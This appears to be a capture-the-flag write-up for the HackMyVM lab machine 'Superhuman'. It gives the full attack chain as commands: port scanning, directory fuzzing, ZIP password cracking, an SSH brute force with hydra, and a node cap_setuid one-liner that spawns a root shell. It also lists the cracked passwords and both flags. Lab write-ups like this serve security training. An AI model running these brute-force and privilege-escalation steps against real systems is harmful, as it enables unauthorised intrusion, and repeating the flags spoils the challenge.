@@ -1,0 +1,104 @@
+🟢 Executive Summary
+Severity: High
+Description:
+Initial access was achieved through the discovery of a hidden text file on the web server using directory fuzzing. The file contained Base85-encoded text that, when decoded, hinted at the name of a password-protected ZIP archive. The archive was downloaded and cracked to reveal a poem, from which a custom wordlist was generated. Brute forcing SSH access using this list yielded valid credentials for the user fred. Privilege escalation to root was accomplished by exploiting the cap_setuid capability assigned to the node binary, granting full system compromise.
+
+🖥️ Scope and Environment
+Platform: HackMyVM
+
+Machine: Superhuman
+
+IP Address: 192.168.1.137
+
+Date of Analysis: 09/08/2025
+
+Difficulty: Easy
+
+🛠 Tools Used
+nmap
+
+gobuster
+
+curl
+
+zip2john
+
+john
+
+hydra
+
+ssh
+
+getcap
+
+🔍 Findings Description
+4.1 Port Scanning
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.137
+nmap -sCV -p<PORTS> 192.168.1.137
+Results:
+
+22/tcp – SSH (OpenSSH 7.9p1 Debian 10+deb10u2)
+
+80/tcp – HTTP (Apache/2.4.38)
+
+The HTTP service did not display any interesting content on the main page, so directory fuzzing was performed.
+
+4.2 Directory Fuzzing
+gobuster dir -u http://192.168.1.137/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
+
+Discovery:
+
+/notes-tips.txt (Status: 200)
+
+4.3 Hidden Notes and Base85 Decoding
+The file was retrieved:
+
+curl http://192.168.1.137/notes-tips.txt
+It contained Base85-encoded text. Decoding revealed a message mentioning a file named salome_and_me with an extension .zip.
+
+4.4 Download and Password Cracking of ZIP
+The ZIP file was downloaded:
+
+wget http://192.168.1.137/salome_and_me.zip
+When attempting extraction, it requested a password. Cracked using:
+
+zip2john salome_and_me.zip > hash.zip
+john --wordlist=rockyou.txt hash.zip
+Password found: turtle
+
+4.5 Poem Analysis and Custom Wordlist
+Extracting the archive revealed salome_and_me.txt, a poem written by “fred”. A custom password list was generated:
+
+cat salome_and_me.txt | tr -cs 'a-zA-Z' '\n' | tr 'A-Z' 'a-z' | sort | uniq > pass.txt
+4.6 SSH Brute Force and Initial Access
+Brute forcing with Hydra:
+
+hydra -l fred -P pass.txt ssh://192.168.1.137 -t 64 -I
+Valid credentials found:
+
+User: fred
+
+Password: schopenhauer
+
+SSH connection:
+
+ssh fred@192.168.1.137
+User flag: Ineedmorepower
+
+4.7 Privilege Escalation via Node Capability
+Checking capabilities:
+
+/usr/sbin/getcap -r / 2>/dev/null
+Findings:
+
+/usr/bin/node = cap_setuid+ep
+
+Exploited using GTFObins technique:
+
+/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+Root flag: Imthesuperhuman
+
+🏁 Flags Obtained
+User: Ineedmorepower
+
+Root: Imthesuperhuman
